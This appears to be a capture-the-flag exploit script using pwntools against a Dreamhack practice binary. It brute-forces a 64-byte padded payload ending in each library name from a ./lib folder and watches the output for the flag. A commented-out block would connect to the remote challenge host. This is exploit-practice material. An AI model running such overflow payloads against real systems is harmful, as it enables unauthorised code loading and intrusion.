from pwn import *
import os

so_list = []
lib_path = "./lib/"
for root, dirs, files in os.walk(lib_path):
    for so in files:
        so_list.append(so.replace(".so", ""))

# print(so_list)

#  context.log_level = "debug"
"""
LOCAL = True
if LOCAL:
    p = process("./main")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host" + str(HOST) + ".dreamhack.games", PORT)
"""


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


dummy = b"0" * (64 - len(so_list[0]))
print(dummy)

for i, so in enumerate(so_list):
    p = process("./main")
    payload = dummy + so.encode("utf-8")
    print(f"{i}: {payload}")
    p.recvuntil("> ")
    p.sendline(payload)
    result = p.recv()
    sleep(0.5)
    if b"Flag" in result:
        print(result)
        break

# To send bytes: p.sendline(payload)
# To send hex-bytes: p.sendline(p64(payload))
# To send numbers: p.sendline(str(payload)) <- i.e.) payload = 0xFFFFFFFF
